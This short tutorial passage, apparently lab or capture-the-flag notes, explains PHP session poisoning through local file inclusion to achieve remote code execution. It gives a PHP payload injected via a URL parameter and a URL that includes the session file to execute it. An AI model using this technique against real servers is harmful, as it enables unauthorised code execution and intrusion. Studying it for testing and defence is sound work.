PHP session files, data which are stored in files on the server, can also be used in an LFI attack, leading to Remote Code Execution by injecting malicious code into session data, which is executed when the application includes the files. 

**Example:**
1. Injecting PHP code into the session variable.
	```php
	<?php echo phpinfo(); ?>
	```
		example: hxxp://IP/sessions.php?page=<?php echo phpinfo(); ?>

2. This code is then saved in the session file on the server.
	`/var/lib/php/sessions/sess_[sessionID]`. 

3. Include this session file, find the cookies of your browser and accessing the URL will execute the injected PHP code.
	`example: hxxp://IP/sessions.php?page=/var/lib/php/sessions/sess_u62etpa4oqmtn3im1j1h7847vk`
